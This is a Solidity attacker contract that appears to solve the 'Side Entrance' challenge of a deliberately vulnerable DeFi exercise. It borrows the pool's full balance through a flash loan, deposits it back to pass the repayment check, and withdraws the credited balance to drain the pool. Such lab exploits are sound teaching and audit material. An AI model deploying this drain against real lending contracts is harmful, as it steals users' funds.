// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";


contract SideAttacker is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool pool; 
    function attack(SideEntranceLenderPool _pool) external {
        pool = _pool;
        uint256 balance = address(pool).balance;
        pool.flashLoan(balance);
        pool.withdraw();
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    function withdraw() external {
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable{

    }
}